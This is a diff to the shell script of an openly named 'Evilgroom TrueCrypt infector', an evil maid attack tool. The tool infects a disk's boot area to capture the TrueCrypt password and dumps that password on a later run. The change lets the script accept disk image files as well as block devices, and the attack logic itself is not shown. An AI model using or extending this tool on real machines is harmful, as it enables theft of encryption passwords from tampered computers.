@@ -4,7 +4,8 @@ echo "Welcome to the Evilgroom TrueCrypt infector, by Florent Monjalet"\
      "(Original attack by Johanna Rutkowska)."
 echo "First usage will infect the boot to make the password retrievable by"\
      "program. Usage on an already infected hard drive will dump the password."
-echo "Please type the path of the device you want to infect."
+echo "Please type the path of the device you want to infect. It might be a"\
+     "block device or a regular file (an image of a disk)."
 echo "Available devices are:"
 
 devices=`ls /dev/sd* | grep "sd.$"`
@@ -18,7 +19,7 @@ while true; do
     echo -n "Enter your selection: "
     read selected_dev
 
-    test -b "$selected_dev" && break
+    test -b "$selected_dev" -o -f "$selected_dev" && break
     echo "Selected device ($selected_dev) does not exist or is not a valid"\
          "block device. Please make sure that you entered the full path"\
          "correctly."
